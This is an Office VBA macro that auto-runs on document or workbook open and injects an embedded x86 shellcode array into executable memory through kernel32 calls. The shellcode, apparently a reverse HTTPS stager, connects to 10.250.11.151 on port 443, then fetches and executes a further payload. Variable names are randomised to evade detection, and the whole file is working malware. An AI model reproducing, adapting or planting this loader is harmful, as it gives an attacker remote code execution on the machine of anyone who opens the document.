#If Vba7 Then
	Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Aynhkl As Long, ByVal Otuwotawt As Long, ByVal Hqbdhovz As LongPtr, Cyt As Long, ByVal Cvdjdgerz As Long, Ggqx As Long) As LongPtr
	Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Lnpiaw As Long, ByVal Wcjbzrn As Long, ByVal Ervcgyo As Long, ByVal Wuqgem As Long) As LongPtr
	Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Ijlpnc As LongPtr, ByRef Ijhqb As Any, ByVal Vaemay As Long) As LongPtr
#Else
	Private Declare Function CreateThread Lib "kernel32" (ByVal Aynhkl As Long, ByVal Otuwotawt As Long, ByVal Hqbdhovz As Long, Cyt As Long, ByVal Cvdjdgerz As Long, Ggqx As Long) As Long
	Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Lnpiaw As Long, ByVal Wcjbzrn As Long, ByVal Ervcgyo As Long, ByVal Wuqgem As Long) As Long
	Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Ijlpnc As Long, ByRef Ijhqb As Any, ByVal Vaemay As Long) As Long
#EndIf

Sub Auto_Open()
	Dim Fryhyo As Long, Gtl As Variant, Dfzvwotj As Long
#If Vba7 Then
	Dim  Wwolrrt As LongPtr, Zlmzmbvfa As LongPtr
#Else
	Dim  Wwolrrt As Long, Zlmzmbvfa As Long
#EndIf
	Gtl = Array(232,143,0,0,0,96,49,210,100,139,82,48,139,82,12,137,229,139,82,20,15,183,74,38,49,255,139,114,40,49,192,172,60,97,124,2,44,32,193,207,13,1,199,73,117,239,82,139,82,16,139,66,60,1,208,87,139,64,120,133,192,116,76,1,208,139,72,24,80,139,88,32,1,211,133,201,116,60,49,255, _
73,139,52,139,1,214,49,192,172,193,207,13,1,199,56,224,117,244,3,125,248,59,125,36,117,224,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18,233,128,255,255,255,93,104,110,101,116,0,104,119,105,110,105,84, _
104,76,119,38,7,255,213,49,219,83,83,83,83,83,232,62,0,0,0,77,111,122,105,108,108,97,47,53,46,48,32,40,87,105,110,100,111,119,115,32,78,84,32,54,46,49,59,32,84,114,105,100,101,110,116,47,55,46,48,59,32,114,118,58,49,49,46,48,41,32,108,105,107,101,32,71,101,99,107,111, _
0,104,58,86,121,167,255,213,83,83,106,3,83,83,104,187,1,0,0,232,154,0,0,0,47,101,49,111,81,122,87,65,80,102,111,97,49,77,114,81,122,49,98,80,121,85,119,69,103,103,108,104,53,111,0,80,104,87,137,159,198,255,213,137,198,83,104,0,2,104,132,83,83,83,87,83,86,104,235,85, _
46,59,255,213,150,106,10,95,83,83,83,83,86,104,45,6,24,123,255,213,133,192,117,20,104,136,19,0,0,104,68,240,53,224,255,213,79,117,225,232,74,0,0,0,106,64,104,0,16,0,0,104,0,0,64,0,83,104,88,164,83,229,255,213,147,83,83,137,231,87,104,0,32,0,0,83,86,104,18,150, _
137,226,255,213,133,192,116,207,139,7,1,195,133,192,117,229,88,195,95,232,127,255,255,255,49,48,46,50,53,48,46,49,49,46,49,53,49,0,187,240,181,162,86,106,0,83,255,213)

	Wwolrrt = VirtualAlloc(0, UBound(Gtl), &H1000, &H40)
	For Dfzvwotj = LBound(Gtl) To UBound(Gtl)
		Fryhyo = Gtl(Dfzvwotj)
		Zlmzmbvfa = RtlMoveMemory(Wwolrrt + Dfzvwotj, Fryhyo, 1)
	Next Dfzvwotj
	Zlmzmbvfa = CreateThread(0, 0, Wwolrrt, 0, 0, 0)
End Sub
Sub AutoOpen()
	Auto_Open
End Sub
Sub Workbook_Open()
	Auto_Open
End Sub

